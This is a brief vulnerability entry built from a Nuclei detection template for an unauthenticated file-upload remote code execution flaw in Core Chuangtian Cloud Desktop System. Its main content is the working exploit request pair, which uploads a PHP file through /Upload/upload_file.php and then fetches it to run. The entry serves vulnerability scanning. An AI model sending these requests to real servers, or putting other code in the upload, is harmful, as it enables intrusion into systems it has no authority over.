# Vulnerability: Core Chuangtian Cloud Desktop System - Remote Code Execution
**Classification:** CWE-77,CWE-434
**Source:** Nuclei Template (`core-chuangtian-cloud-rce.yaml`)

## Description
Core Chuangtian Cloud Desktop System is susceptible to remote code execution vulnerabilities.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /Upload/upload_file.php?l=test HTTP/1.1
Host: {{Hostname}}
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv

------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
Content-Type: image/avif

<?php echo md5("{{string}}");unlink(__FILE__);?>
------WebKitFormBoundaryfcKRltGv--

GET /Upload/test/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
```

